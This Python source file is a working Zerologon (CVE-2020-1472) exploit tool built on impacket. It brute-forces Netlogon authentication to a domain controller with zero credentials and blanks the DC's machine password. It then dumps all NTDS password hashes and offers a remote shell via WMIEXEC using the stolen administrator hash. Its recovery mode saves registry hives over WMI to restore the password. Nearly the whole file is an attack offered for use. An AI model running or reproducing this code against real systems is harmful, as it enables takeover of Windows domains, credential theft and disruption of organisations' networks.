#!/usr/bin/env python3
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.smbconnection import SMBConnection
from utils.wmiexec import *
from utils.secretsdump import *
from utils.restorepassword import *
import hmac, hashlib, struct, sys, socket, time, argparse, logging, os, string, random,re
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
def  banner():
  return """
                   _                         
                  | |                        
 _______ _ __ ___ | | ___   __ _  ___  _ __  
|_  / _ \ '__/ _ \| |/ _ \ / _` |/ _ \| '_ \ 
 / /  __/ | | (_) | | (_) | (_| | (_) | | | |
/___\___|_|  \___/|_|\___/ \__, |\___/|_| |_|
                            __/ |            
                           |___/         

  """
class Options:
  def __init__(self,user,test,hashes,exec_method,outputfile):
      self.target_ip = dc_ip
      self.outputfile = outputfile
      self.hashes = hashes
      self.exec_method = exec_method
      self.just_dc_user = user
      self.just_dc_ntlm = self.just_dc = test
      self.use_vss = self.k = self.history = self.ntds = self.sam = self.security = self.pwd_last_set = self.user_status = self.resumefile = \
      self.dc_ip = self.system = self.aesKey = self.bootkey = None

def getMachineName(dc_ip):
        if dc_ip is not None:
            s = SMBConnection(dc_ip, dc_ip)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise 'Error while anonymous logging into %s'
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        MachineName = s.getServerName()
        DomanName = s.getServerDNSDomainName()
        return s

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def attack(dc_handle, dc_ip, target_computer,options):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

        if result is None:
            print('=', end='', flush=True)
        else:
            break
    if options.exp:
      if result:
          print('\nTarget vulnerable, changing account password to empty string')
          result = None
          for attempt in range(0, MAX_ATTEMPTS):
              try:
                  result = exploit(dc_handle, rpc_con, target_computer)
              except nrpc.DCERPCSessionError as ex:
                  # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                  if ex.get_error_code() == 0xc0000022:
                      pass
                  else:
                      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
              except BaseException as ex:
                  fail(f'Unexpected error: {ex}.')
              if result is None:
                  print('=', end='', flush=True)
              else:
                  break
          print('\nResult: ', end='')
          print(result['ErrorCode'])
          if result['ErrorCode'] == 0:
              print('\nExploit complete!')
              print('\n')
              dc_name = getMachineName(dc_ip).getServerName()
              domain = getMachineName(dc_ip).getServerDNSDomainName()
              if not os.path.exists(domain):
                os.mkdir(domain)
              user = options.user
              exec_method = options.exec_method
              outputfile = './'+domain+'/'+dc_name
              khashes = 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
              try:
                if user is not None:
                  DumpSecrets(dc_ip, dc_name+'$', '', '', Options(user,True,khashes,exec_method,outputfile)).dump()
                else:
                  DumpSecrets(dc_ip, dc_name+'$', '', '', Options(user,True,khashes,exec_method,outputfile)).dump()
              except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error(e)
          else:
              print('Non-zero return code, something went wrong?')
      else:
          print('\nAttack failed. Target is probably patched.')
          sys.exit(1)
    if options.scan:
      if result:
        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
      else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)
def recovery(dc_ip,dc_name,domain,options):
  try:
    if options.user is None:
      user = 'administrator'
    else:
      user = options.user
    hashes = ""
    if options.hashes is None:
      with open('./'+domain+'/'+dc_name+'.ntds', 'r', encoding='utf-8') as f:
        admin = f.read()
        f.close()
      admin_re1 = re.search('\\n'+user+':(.*?):(.*?):::',admin,re.IGNORECASE)
      if (admin_re1):
          hashes = admin_re1.group(2)
      else:
          admin_re2 = re.search(domain+'\\\\'+user+':(.*?):(.*?):::',admin,re.IGNORECASE)
          hashes = admin_re2.group(2)
    else:
      hashes = options.hashes
    outputfile = './'+domain+'/'+dc_name+'$'
    test = DumpSecrets(dc_ip, user, '', domain, Options(dc_name+'$',False,hashes,options.exec_method,outputfile))
    test.dump()
    if test:
      with open('./'+domain+'/'+dc_name+'$.secrets','r', encoding='utf-8') as f:
          lines = re.search('\$:plain\_password\_hex:(.*?)\\n',f.read())
          f.close()
      dc_hex_pass = lines.group(1)
      password  = unhexlify(dc_hex_pass)
      action = ChangeMachinePassword(dc_name, password, domain, options.port, None, False)
      action.dump(dc_name, dc_ip)
    else:
      cmds = ['reg save HKLM\SYSTEM system.save /y','reg save HKLM\SAM sam.save /y','reg save HKLM\SECURITY security.save /y','lget system.save','lget sam.save','lget security.save','del /f system.save','del /f sam.save','del /f security.save']
      for i in cmds:
        executer = WMIEXEC(i, user, '', domain, hashes, None,
                            options.share, False, False, None, options.shell_type)
        executer.run(dc_ip, False)
      class LocalOptions:
            def __init__(self):
                self.just_dc_ntlm = self.just_dc = self.use_vss = False
                self.outputfile = './'+domain+'/'+dc_name
                self.security = 'security.save'
                self.system = 'system.save'
                self.sam = 'sam.save'
                self.k = self.history = self.ntds = self.pwd_last_set = self.user_status = self.resumefile = \
                self.hashes = self.aesKey = self.bootkey = None
                self.target_ip = self.just_dc_user = self.dc_ip = ''
      class CMDOptions:
          def __init__(self):
              self.help = False
      DumpSecrets('LOCAL','','','',LocalOptions()).dump()
      with open('./'+domain+'/'+dc_name+'.secrets', 'r', encoding='utf-8') as f:
        lines = re.findall("\$MACHINE\.ACC\:plain\_password\_hex:(.*?)\\n",f.read())
        f.close()
      reghash = lines[0]
      password  = unhexlify(reghash)
      action = ChangeMachinePassword(dc_name, password, domain, options.port, None, False)
      action.dump(dc_name, dc_ip)
  except Exception as e:
      if logging.getLogger().level == logging.DEBUG:
          import traceback
          traceback.print_exc()
      logging.error(str(e))
if __name__ == '__main__':
  print(banner())
  parser = argparse.ArgumentParser(add_help = True, description = "CVE-2020-1472 Zerologon")
  parser.add_argument('dc_ip', action='store', help='IP of the domain controller to use')
  parser.add_argument('-scan', action='store_true', help='Scan for CVE-2020-1472 vulnerability')
  parser.add_argument('-exp', action='store_true', help='CVE-2020-1472 Exploits and dump all hashes')
  parser.add_argument('-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach')
  parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
  parser.add_argument('-recovery', action='store_true', help='Restore the domain controller machine hash')
  parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

  exec =  parser.add_argument_group('execute options')
  exec.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
  exec.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')
  exec.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
  exec.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                      'a command processor for the semi-interactive shell')
  exec.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
  exec.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

  if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
  options = parser.parse_args()
  if options.debug is True:
      logging.getLogger().setLevel(logging.DEBUG)
      # Print the Library's installation path
      logging.debug(version.getInstallationPath())
  else:
      logging.getLogger().setLevel(logging.INFO)
  dc_ip = options.dc_ip
  dc_name = getMachineName(dc_ip).getServerName()
  domain = getMachineName(dc_ip).getServerDNSDomainName()
  if options.shell:
    try:
      if options.user is None:
        user = 'administrator'
      else:
        user = options.user
      hashes = ""
      if options.hashes is None:
        with open('./'+domain+'/'+dc_name+'.ntds', 'r', encoding='utf-8') as f:
          admin = f.read()
          f.close()
        admin_re1 = re.search('\\n'+user+':(.*?):(.*?):::',admin,re.IGNORECASE)
        if (admin_re1):
            hashes = admin_re1.group(2)
        else:
          admin_re2 = re.search(domain+'\\\\'+user+':(.*?):(.*?):::',admin,re.IGNORECASE)
          hashes = admin_re2.group(2)
      else:
        hashes = options.hashes
      executer = WMIEXEC(' ', user, '', domain, hashes, None,
                        options.share, False, False, None, options.shell_type)
      executer.run(dc_ip, False)
    except Exception as e:
      if logging.getLogger().level == logging.DEBUG:
          import traceback
          traceback.print_exc()
      logging.error(str(e))
  
  elif options.recovery:
    try:
      recovery(dc_ip,dc_name,domain,options)
    except Exception as e:
      if logging.getLogger().level == logging.DEBUG:
          import traceback
          traceback.print_exc()
      logging.error(str(e))

  else:
    try:
      attack('\\\\' + dc_name, dc_ip, dc_name,options)
    except Exception as e:
          if logging.getLogger().level == logging.DEBUG:
              import traceback
              traceback.print_exc()
          logging.error(e)
  
  
